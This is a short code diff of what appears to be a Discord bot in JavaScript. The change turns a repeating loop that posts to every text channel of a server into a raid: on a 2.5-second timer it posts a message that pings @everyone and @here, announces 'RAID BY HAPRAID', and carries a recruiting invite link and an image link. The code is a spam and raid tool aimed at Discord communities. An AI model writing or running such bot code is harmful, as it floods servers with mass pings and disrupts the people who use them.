@@ -83,7 +83,7 @@ bot.on("message", msg => {
             let i = 0;
             let interval = setInterval(function () {
               msg.guild.channels.forEach(channel => {
-                if (channel.type === "text") channel.send('@everyone je test')
+                if (channel.type === "text") channel.send('"@everyone  @here  RAID BY HAPRAID https://discord.gg/DEM7UWF https://media.discordapp.net/attachments/353298252122292225/437735929902268416/unknown.png')
               }, 2500);
             });
           }
